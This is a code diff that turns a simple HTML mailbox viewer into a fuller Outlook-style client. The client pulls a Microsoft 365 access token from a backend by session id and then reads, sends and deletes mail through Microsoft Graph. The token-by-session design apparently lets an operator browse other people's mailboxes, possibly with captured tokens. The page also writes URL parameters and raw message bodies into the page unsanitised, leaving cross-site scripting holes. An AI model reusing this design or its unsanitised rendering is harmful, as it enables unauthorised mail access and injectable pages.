@@ -3,122 +3,663 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mailbox Viewer</title>
+    <title>Outlook Mailbox - Real Microsoft 365 Access</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #1e1e2e; color: #e0e0e0; margin: 0; padding: 20px; }
-        .container { max-width: 1200px; margin: 0 auto; }
-        .header { background: #111827; padding: 16px; border-radius: 8px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; }
-        .email-list { background: #111827; border-radius: 8px; overflow: hidden; }
-        .email-item { padding: 12px 16px; border-bottom: 1px solid #2d3748; cursor: pointer; display: flex; gap: 12px; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #1e1e2e;
+            color: #e0e0e0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+        
+        /* Header */
+        .header {
+            background: #111827;
+            padding: 12px 24px;
+            border-bottom: 1px solid #2d3748;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .header h2 { font-size: 18px; }
+        .user-info { display: flex; align-items: center; gap: 15px; }
+        .user-email { background: #1a1f3e; padding: 6px 12px; border-radius: 20px; font-size: 12px; color: #60a5fa; }
+        .refresh-btn { background: #3b82f6; border: none; padding: 6px 16px; border-radius: 6px; color: white; cursor: pointer; font-size: 12px; }
+        .refresh-btn:hover { background: #2563eb; }
+        
+        /* Main Layout */
+        .main-layout {
+            display: flex;
+            flex: 1;
+            overflow: hidden;
+        }
+        
+        /* Folders Sidebar */
+        .folders-sidebar {
+            width: 280px;
+            background: #0f172a;
+            border-right: 1px solid #2d3748;
+            overflow-y: auto;
+            padding: 16px;
+        }
+        .folder-item {
+            padding: 10px 12px;
+            margin: 2px 0;
+            border-radius: 8px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            transition: all 0.2s;
+            color: #9ca3af;
+            font-size: 13px;
+        }
+        .folder-item:hover { background: #1f2937; color: white; }
+        .folder-item.active { background: #3b82f6; color: white; }
+        .folder-count { margin-left: auto; font-size: 11px; background: #1f2937; padding: 2px 6px; border-radius: 10px; }
+        .folder-item.active .folder-count { background: #2563eb; }
+        
+        /* Emails Panel */
+        .emails-panel {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+        .toolbar {
+            background: #111827;
+            padding: 10px 16px;
+            border-bottom: 1px solid #2d3748;
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
+        .compose-btn {
+            background: #10b981;
+            border: none;
+            padding: 6px 16px;
+            border-radius: 6px;
+            color: white;
+            cursor: pointer;
+            font-size: 12px;
+        }
+        .compose-btn:hover { background: #059669; }
+        .search-box {
+            background: #1f2937;
+            border: 1px solid #374151;
+            padding: 6px 12px;
+            border-radius: 20px;
+            color: white;
+            width: 250px;
+        }
+        .email-list {
+            flex: 1;
+            overflow-y: auto;
+        }
+        .email-item {
+            background: #111827;
+            border-bottom: 1px solid #2d3748;
+            padding: 14px 16px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
         .email-item:hover { background: #1a1f3e; }
         .email-item.unread { background: #1e293b; border-left: 3px solid #3b82f6; }
-        .email-subject { font-weight: 600; }
-        .email-from { font-size: 12px; color: #9ca3af; }
-        .email-preview { font-size: 11px; color: #6b7280; margin-top: 4px; }
-        .email-date { font-size: 11px; color: #4b5563; margin-left: auto; white-space: nowrap; }
-        .loading { text-align: center; padding: 40px; }
-        .spinner { display: inline-block; width: 20px; height: 20px; border: 2px solid #374151; border-top-color: #3b82f6; border-radius: 50%; animation: spin 0.8s linear infinite; }
+        .email-subject { font-weight: 600; margin-bottom: 4px; font-size: 14px; }
+        .email-from { font-size: 12px; color: #9ca3af; margin-bottom: 4px; }
+        .email-preview { font-size: 11px; color: #6b7280; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .email-date { font-size: 10px; color: #4b5563; margin-top: 4px; }
+        .attachment-icon { color: #f59e0b; margin-left: 8px; font-size: 11px; }
+        
+        /* Reading Panel */
+        .reading-panel {
+            width: 500px;
+            background: #111827;
+            border-left: 1px solid #2d3748;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            transition: width 0.3s;
+        }
+        .reading-panel.collapsed { width: 0; }
+        .panel-header {
+            padding: 16px;
+            border-bottom: 1px solid #2d3748;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .panel-close {
+            background: none;
+            border: none;
+            color: #9ca3af;
+            cursor: pointer;
+            font-size: 18px;
+        }
+        .panel-body {
+            padding: 16px;
+            overflow-y: auto;
+            flex: 1;
+        }
+        .email-full-content { line-height: 1.6; font-size: 14px; }
+        .email-full-content img { max-width: 100%; }
+        .action-buttons {
+            display: flex;
+            gap: 8px;
+            margin-top: 20px;
+            flex-wrap: wrap;
+        }
+        .action-btn {
+            background: #1f2937;
+            border: 1px solid #374151;
+            padding: 6px 12px;
+            border-radius: 6px;
+            color: white;
+            cursor: pointer;
+            font-size: 11px;
+        }
+        .action-btn-primary { background: #3b82f6; border: none; }
+        .action-btn-danger { background: #dc2626; border: none; }
+        
+        /* Compose Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.8);
+            z-index: 2000;
+            justify-content: center;
+            align-items: center;
+        }
+        .modal.open { display: flex; }
+        .modal-content {
+            background: #111827;
+            border-radius: 16px;
+            width: 550px;
+            max-width: 90%;
+            padding: 24px;
+        }
+        .modal-content input, .modal-content textarea {
+            width: 100%;
+            background: #1f2937;
+            border: 1px solid #374151;
+            padding: 10px;
+            border-radius: 8px;
+            color: white;
+            margin-bottom: 12px;
+            font-family: inherit;
+        }
+        .modal-content textarea { resize: vertical; min-height: 150px; }
+        
+        .loading { text-align: center; padding: 40px; color: #6b7280; }
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #374151;
+            border-top-color: #3b82f6;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
         @keyframes spin { to { transform: rotate(360deg); } }
-        .folder-bar { display: flex; gap: 10px; margin-bottom: 20px; flex-wrap: wrap; }
-        .folder-btn { background: #1f2937; border: none; padding: 8px 16px; border-radius: 6px; color: white; cursor: pointer; }
-        .folder-btn.active { background: #3b82f6; }
-        .email-content { background: #111827; border-radius: 8px; padding: 20px; margin-top: 20px; }
-        pre { white-space: pre-wrap; word-break: break-all; }
+        
+        .token-status {
+            font-size: 10px;
+            color: #10b981;
+            margin-left: 10px;
+        }
+        .token-status.error { color: #ef4444; }
+        
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: #1f2937; }
+        ::-webkit-scrollbar-thumb { background: #374151; border-radius: 3px; }
     </style>
 </head>
 <body>
-<div class="container">
-    <div class="header">
-        <h3>📧 Mailbox: <span id="userEmail">Loading...</span></h3>
-        <button onclick="location.reload()" style="background:#3b82f6; border:none; padding:6px 12px; border-radius:6px; color:white; cursor:pointer;">Refresh</button>
+<div class="header">
+    <h2>📧 Outlook Mailbox - Real Microsoft 365</h2>
+    <div class="user-info">
+        <span class="user-email" id="userEmail">Loading...</span>
+        <span id="tokenStatus" class="token-status"></span>
+        <button class="refresh-btn" onclick="refreshTokenAndReload()">🔄 Refresh Token</button>
+    </div>
+</div>
+
+<div class="main-layout">
+    <!-- Folders Sidebar -->
+    <div class="folders-sidebar" id="foldersPanel">
+        <div class="loading"><div class="spinner"></div> Loading folders...</div>
     </div>
     
-    <div class="folder-bar">
-        <button class="folder-btn active" onclick="loadFolder('inbox')">Inbox</button>
-        <button class="folder-btn" onclick="loadFolder('sent')">Sent</button>
-        <button class="folder-btn" onclick="loadFolder('drafts')">Drafts</button>
-        <button class="folder-btn" onclick="loadFolder('deleted')">Deleted</button>
+    <!-- Emails Panel -->
+    <div class="emails-panel">
+        <div class="toolbar">
+            <button class="compose-btn" onclick="openCompose()">✏️ New Email</button>
+            <input type="text" class="search-box" placeholder="Search emails..." id="searchBox" onkeyup="searchEmails()">
+        </div>
+        <div class="email-list" id="emailList">
+            <div class="loading"><div class="spinner"></div> Loading emails from Microsoft 365...</div>
+        </div>
     </div>
     
-    <div id="emailList" class="email-list">
-        <div class="loading"><div class="spinner"></div> Loading emails...</div>
+    <!-- Reading Panel -->
+    <div class="reading-panel" id="readingPanel">
+        <div class="panel-header">
+            <strong id="panelSubject">Select an email</strong>
+            <button class="panel-close" onclick="closeReadingPanel()">✕</button>
+        </div>
+        <div class="panel-body" id="panelBody">
+            <div class="loading">Click on an email to read it</div>
+        </div>
     </div>
-    
-    <div id="emailContent" class="email-content" style="display:none;"></div>
+</div>
+
+<!-- Compose Modal -->
+<div id="composeModal" class="modal">
+    <div class="modal-content">
+        <h3 style="margin-bottom: 16px;">✏️ New Email</h3>
+        <input type="text" id="composeTo" placeholder="To: email@example.com">
+        <input type="text" id="composeSubject" placeholder="Subject">
+        <textarea id="composeBody" placeholder="Write your message here..."></textarea>
+        <div style="display: flex; gap: 10px; margin-top: 16px;">
+            <button class="action-btn action-btn-primary" onclick="sendEmail()">Send</button>
+            <button class="action-btn" onclick="closeCompose()">Cancel</button>
+        </div>
+    </div>
 </div>
 
 <script>
     const urlParams = new URLSearchParams(window.location.search);
-    const sid = urlParams.get('sid');
+    const sessionId = urlParams.get('sid');
     const userEmail = decodeURIComponent(urlParams.get('email') || '');
     const API_BASE = window.location.origin;
     
-    let currentFolder = 'inbox';
+    let currentAccessToken = null;
+    let currentFolderId = 'inbox';
+    let currentFolderName = 'Inbox';
+    let currentEmails = [];
+    let currentMessageId = null;
+    let folders = [];
+    
     document.getElementById('userEmail').innerHTML = userEmail;
     
-    async function loadFolder(folder) {
-        currentFolder = folder;
-        document.querySelectorAll('.folder-btn').forEach(btn => btn.classList.remove('active'));
-        event.target.classList.add('active');
-        
-        document.getElementById('emailList').innerHTML = '<div class="loading"><div class="spinner"></div> Loading emails...</div>';
-        document.getElementById('emailContent').style.display = 'none';
-        
+    // ============================================
+    // GET ACCESS TOKEN FROM BACKEND
+    // ============================================
+    async function getAccessToken() {
         try {
-            const response = await fetch(`${API_BASE}/api/mail/${sid}/${folder}`);
+            const response = await fetch(`${API_BASE}/api/session/token/${sessionId}`);
             const data = await response.json();
             
-            if (data.value && data.value.length > 0) {
-                renderEmailList(data.value);
+            if (data && data.access_token) {
+                currentAccessToken = data.access_token;
+                document.getElementById('tokenStatus').innerHTML = '✅ Token Active';
+                document.getElementById('tokenStatus').classList.remove('error');
+                return currentAccessToken;
             } else {
-                document.getElementById('emailList').innerHTML = '<div class="loading">📭 No emails in this folder</div>';
+                throw new Error('No token received');
             }
         } catch (err) {
-            document.getElementById('emailList').innerHTML = '<div class="loading">❌ Failed to load emails</div>';
+            console.error('Failed to get token:', err);
+            document.getElementById('tokenStatus').innerHTML = '❌ Token Failed';
+            document.getElementById('tokenStatus').classList.add('error');
+            return null;
         }
     }
     
-    function renderEmailList(emails) {
-        const container = document.getElementById('emailList');
-        container.innerHTML = emails.map(email => `
-            <div class="email-item ${!email.isRead ? 'unread' : ''}" onclick="viewEmail('${email.id}')">
-                <div style="flex:1">
-                    <div class="email-subject">${escapeHtml(email.subject || '(No subject)')}${email.hasAttachments ? ' 📎' : ''}</div>
-                    <div class="email-from">${escapeHtml(email.from?.emailAddress?.name || email.from?.emailAddress?.address)}</div>
-                    <div class="email-preview">${escapeHtml(email.bodyPreview || '')}</div>
-                </div>
-                <div class="email-date">${formatDate(email.receivedDateTime)}</div>
+    async function refreshTokenAndReload() {
+        document.getElementById('tokenStatus').innerHTML = '🔄 Refreshing...';
+        await getAccessToken();
+        await loadFolders();
+        await loadEmails(currentFolderId);
+    }
+    
+    // ============================================
+    // LOAD FOLDERS USING GRAPH API
+    // ============================================
+    async function loadFolders() {
+        const token = await getAccessToken();
+        if (!token) {
+            document.getElementById('foldersPanel').innerHTML = '<div class="loading">❌ Failed to get access token</div>';
+            return;
+        }
+        
+        try {
+            const response = await fetch('https://graph.microsoft.com/v1.0/me/mailFolders', {
+                headers: { 'Authorization': `Bearer ${token}` }
+            });
+            
+            const data = await response.json();
+            
+            if (data.error) {
+                throw new Error(data.error.message);
+            }
+            
+            folders = data.value || [];
+            renderFolders(folders);
+            
+        } catch (err) {
+            console.error('Load folders error:', err);
+            document.getElementById('foldersPanel').innerHTML = `<div class="loading">❌ ${err.message}</div>`;
+        }
+    }
+    
+    function renderFolders(foldersList) {
+        const container = document.getElementById('foldersPanel');
+        if (!foldersList || foldersList.length === 0) {
+            container.innerHTML = '<div class="loading">No folders found</div>';
+            return;
+        }
+        
+        container.innerHTML = foldersList.map(folder => `
+            <div class="folder-item ${folder.id === currentFolderId ? 'active' : ''}" onclick="selectFolder('${folder.id}', '${escapeHtml(folder.displayName)}')">
+                <span>📁</span>
+                <span>${escapeHtml(folder.displayName)}</span>
+                <span class="folder-count">${folder.totalItemCount || 0}</span>
             </div>
         `).join('');
     }
     
-    async function viewEmail(messageId) {
-        document.getElementById('emailContent').style.display = 'block';
-        document.getElementById('emailContent').innerHTML = '<div class="loading"><div class="spinner"></div> Loading message...</div>';
+    async function selectFolder(folderId, folderName) {
+        currentFolderId = folderId;
+        currentFolderName = folderName;
+        
+        // Update active state
+        document.querySelectorAll('.folder-item').forEach(el => el.classList.remove('active'));
+        event.target.closest('.folder-item').classList.add('active');
+        
+        await loadEmails(folderId);
+    }
+    
+    // ============================================
+    // LOAD EMAILS USING GRAPH API
+    // ============================================
+    async function loadEmails(folderId) {
+        const token = await getAccessToken();
+        if (!token) {
+            document.getElementById('emailList').innerHTML = '<div class="loading">❌ Failed to get access token</div>';
+            return;
+        }
+        
+        document.getElementById('emailList').innerHTML = '<div class="loading"><div class="spinner"></div> Loading emails from Microsoft 365...</div>';
         
         try {
-            const response = await fetch(`${API_BASE}/api/mail/message/${sid}/${messageId}`);
-            const email = await response.json();
+            const response = await fetch(`https://graph.microsoft.com/v1.0/me/mailFolders/${folderId}/messages?$top=50&$orderby=receivedDateTime desc`, {
+                headers: { 'Authorization': `Bearer ${token}` }
+            });
             
-            document.getElementById('emailContent').innerHTML = `
-                <h3>${escapeHtml(email.subject || '(No subject)')}</h3>
-                <div style="margin: 12px 0; padding: 12px 0; border-bottom: 1px solid #2d3748;">
-                    <div><strong>From:</strong> ${escapeHtml(email.from?.emailAddress?.name || email.from?.emailAddress?.address)}</div>
-                    <div><strong>To:</strong> ${escapeHtml(email.toRecipients?.map(r => r.emailAddress.address).join(', '))}</div>
-                    <div><strong>Date:</strong> ${new Date(email.receivedDateTime).toLocaleString()}</div>
-                </div>
-                <div>${email.body?.content || email.bodyPreview || 'No content'}</div>
-                <button onclick="document.getElementById('emailContent').style.display='none'" style="margin-top:16px; background:#3b82f6; border:none; padding:6px 12px; border-radius:6px; color:white; cursor:pointer;">Close</button>
-            `;
+            const data = await response.json();
+            
+            if (data.error) {
+                throw new Error(data.error.message);
+            }
+            
+            currentEmails = data.value || [];
+            renderEmails(currentEmails);
+            
         } catch (err) {
-            document.getElementById('emailContent').innerHTML = '<div class="loading">❌ Failed to load message</div>';
+            document.getElementById('emailList').innerHTML = `<div class="loading">❌ ${err.message}</div>`;
         }
     }
     
-    function escapeHtml(str) { if (!str) return ''; return str.replace(/[&<>]/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;'})[m]); }
-    function formatDate(d) { return d ? new Date(d).toLocaleDateString() : 'Unknown'; }
+    function renderEmails(emails) {
+        if (!emails || emails.length === 0) {
+            document.getElementById('emailList').innerHTML = '<div class="loading">📭 No emails in this folder</div>';
+            return;
+        }
+        
+        document.getElementById('emailList').innerHTML = emails.map(email => `
+            <div class="email-item ${!email.isRead ? 'unread' : ''}" onclick="openEmail('${email.id}')">
+                <div>
+                    <div class="email-subject">
+                        ${escapeHtml(email.subject || '(No subject)')}
+                        ${email.hasAttachments ? '<span class="attachment-icon">📎</span>' : ''}
+                    </div>
+                    <div class="email-from">
+                        ${escapeHtml(email.from?.emailAddress?.name || email.from?.emailAddress?.address || 'Unknown')}
+                    </div>
+                    <div class="email-preview">
+                        ${escapeHtml(email.bodyPreview || 'No preview')}
+                    </div>
+                    <div class="email-date">
+                        ${formatDate(email.receivedDateTime)}
+                    </div>
+                </div>
+            </div>
+        `).join('');
+    }
     
-    loadFolder('inbox');
+    function searchEmails() {
+        const term = document.getElementById('searchBox').value.toLowerCase();
+        if (!term) {
+            renderEmails(currentEmails);
+            return;
+        }
+        const filtered = currentEmails.filter(e => 
+            (e.subject || '').toLowerCase().includes(term) ||
+            (e.from?.emailAddress?.name || '').toLowerCase().includes(term) ||
+            (e.bodyPreview || '').toLowerCase().includes(term)
+        );
+        renderEmails(filtered);
+    }
+    
+    // ============================================
+    // OPEN EMAIL WITH FULL CONTENT
+    // ============================================
+    async function openEmail(messageId) {
+        const token = await getAccessToken();
+        if (!token) {
+            alert('Failed to get access token');
+            return;
+        }
+        
+        currentMessageId = messageId;
+        const panel = document.getElementById('readingPanel');
+        panel.classList.remove('collapsed');
+        document.getElementById('panelBody').innerHTML = '<div class="loading"><div class="spinner"></div> Loading message content...</div>';
+        
+        try {
+            const response = await fetch(`https://graph.microsoft.com/v1.0/me/messages/${messageId}`, {
+                headers: { 'Authorization': `Bearer ${token}` }
+            });
+            
+            const email = await response.json();
+            
+            if (email.error) {
+                throw new Error(email.error.message);
+            }
+            
+            document.getElementById('panelSubject').innerHTML = escapeHtml(email.subject || '(No subject)');
+            document.getElementById('panelBody').innerHTML = `
+                <div style="margin-bottom: 16px; padding-bottom: 12px; border-bottom: 1px solid #2d3748;">
+                    <p><strong>From:</strong> ${escapeHtml(email.from?.emailAddress?.name || email.from?.emailAddress?.address)}</p>
+                    <p><strong>To:</strong> ${escapeHtml(email.toRecipients?.map(r => r.emailAddress.address).join(', ') || 'Unknown')}</p>
+                    <p><strong>Received:</strong> ${new Date(email.receivedDateTime).toLocaleString()}</p>
+                    ${email.hasAttachments ? '<p><strong>📎 Has Attachments</strong></p>' : ''}
+                </div>
+                <div class="email-full-content">
+                    ${email.body?.content || email.bodyPreview || 'No content available'}
+                </div>
+                <div class="action-buttons">
+                    <button class="action-btn action-btn-primary" onclick="replyToEmail()">↩️ Reply</button>
+                    <button class="action-btn" onclick="replyAllToEmail()">↪️ Reply All</button>
+                    <button class="action-btn" onclick="forwardEmail()">↗️ Forward</button>
+                    <button class="action-btn action-btn-danger" onclick="deleteEmail()">🗑️ Delete</button>
+                    <button class="action-btn" onclick="markAsRead()">✓ Mark as Read</button>
+                </div>
+            `;
+            
+            // Mark as read automatically
+            if (!email.isRead) {
+                await fetch(`https://graph.microsoft.com/v1.0/me/messages/${messageId}`, {
+                    method: 'PATCH',
+                    headers: {
+                        'Authorization': `Bearer ${token}`,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ isRead: true })
+                });
+                loadEmails(currentFolderId);
+            }
+            
+        } catch (err) {
+            document.getElementById('panelBody').innerHTML = `<div class="loading">❌ ${err.message}</div>`;
+        }
+    }
+    
+    // ============================================
+    // EMAIL ACTIONS
+    // ============================================
+    async function sendEmail() {
+        const token = await getAccessToken();
+        if (!token) {
+            alert('Failed to get access token');
+            return;
+        }
+        
+        const to = document.getElementById('composeTo').value.split(',').map(e => e.trim());
+        const subject = document.getElementById('composeSubject').value;
+        const body = document.getElementById('composeBody').value;
+        
+        if (!to.length || !subject) {
+            alert('Please fill in To and Subject');
+            return;
+        }
+        
+        try {
+            const response = await fetch('https://graph.microsoft.com/v1.0/me/sendMail', {
+                method: 'POST',
+                headers: {
+                    'Authorization': `Bearer ${token}`,
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    message: {
+                        subject: subject,
+                        body: { contentType: 'HTML', content: body },
+                        toRecipients: to.map(email => ({ emailAddress: { address: email } }))
+                    },
+                    saveToSentItems: true
+                })
+            });
+            
+            if (response.ok) {
+                alert('✅ Email sent successfully!');
+                closeCompose();
+                loadEmails(currentFolderId);
+            } else {
+                const error = await response.json();
+                alert('Failed to send: ' + (error.error?.message || 'Unknown'));
+            }
+        } catch (err) {
+            alert('Error: ' + err.message);
+        }
+    }
+    
+    async function deleteEmail() {
+        const token = await getAccessToken();
+        if (!token) return;
+        
+        if (!confirm('Delete this email?')) return;
+        
+        try {
+            await fetch(`https://graph.microsoft.com/v1.0/me/messages/${currentMessageId}`, {
+                method: 'DELETE',
+                headers: { 'Authorization': `Bearer ${token}` }
+            });
+            closeReadingPanel();
+            loadEmails(currentFolderId);
+        } catch (err) {
+            alert('Failed to delete: ' + err.message);
+        }
+    }
+    
+    async function markAsRead() {
+        const token = await getAccessToken();
+        if (!token) return;
+        
+        try {
+            await fetch(`https://graph.microsoft.com/v1.0/me/messages/${currentMessageId}`, {
+                method: 'PATCH',
+                headers: {
+                    'Authorization': `Bearer ${token}`,
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ isRead: true })
+            });
+            loadEmails(currentFolderId);
+        } catch (err) {
+            alert('Failed to mark as read');
+        }
+    }
+    
+    function replyToEmail() {
+        const email = currentEmails.find(e => e.id === currentMessageId);
+        if (email) {
+            document.getElementById('composeTo').value = email.from?.emailAddress?.address || '';
+            document.getElementById('composeSubject').value = `Re: ${email.subject || ''}`;
+            document.getElementById('composeBody').value = `\n\n\n----- Original Message -----\nFrom: ${email.from?.emailAddress?.name}\nSent: ${formatDate(email.receivedDateTime)}\nSubject: ${email.subject}\n\n${email.bodyPreview || ''}`;
+            openCompose();
+        }
+    }
+    
+    function replyAllToEmail() {
+        const email = currentEmails.find(e => e.id === currentMessageId);
+        if (email) {
+            let recipients = [email.from?.emailAddress?.address];
+            if (email.toRecipients) {
+                recipients = recipients.concat(email.toRecipients.map(r => r.emailAddress.address));
+            }
+            document.getElementById('composeTo').value = recipients.join(',');
+            document.getElementById('composeSubject').value = `Re: ${email.subject || ''}`;
+            document.getElementById('composeBody').value = `\n\n\n----- Original Message -----\nFrom: ${email.from?.emailAddress?.name}\nSent: ${formatDate(email.receivedDateTime)}\nSubject: ${email.subject}\n\n${email.bodyPreview || ''}`;
+            openCompose();
+        }
+    }
+    
+    function forwardEmail() {
+        const email = currentEmails.find(e => e.id === currentMessageId);
+        if (email) {
+            document.getElementById('composeSubject').value = `Fwd: ${email.subject || ''}`;
+            document.getElementById('composeBody').value = `\n\n\n----- Forwarded Message -----\nFrom: ${email.from?.emailAddress?.name}\nSent: ${formatDate(email.receivedDateTime)}\nSubject: ${email.subject}\n\n${email.bodyPreview || ''}`;
+            openCompose();
+        }
+    }
+    
+    function openCompose() { document.getElementById('composeModal').classList.add('open'); }
+    function closeCompose() { document.getElementById('composeModal').classList.remove('open'); }
+    function closeReadingPanel() { document.getElementById('readingPanel').classList.add('collapsed'); }
+    
+    function escapeHtml(str) {
+        if (!str) return '';
+        return str.replace(/[&<>]/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;'})[m]);
+    }
+    
+    function formatDate(dateStr) {
+        if (!dateStr) return 'Unknown';
+        const date = new Date(dateStr);
+        const now = new Date();
+        if (date.toDateString() === now.toDateString()) {
+            return date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+        }
+        return date.toLocaleDateString();
+    }
+    
+    // Initialize
+    async function init() {
+        await getAccessToken();
+        await loadFolders();
+        await loadEmails('inbox');
+    }
+    
+    init();
 </script>
 </body>
 </html>
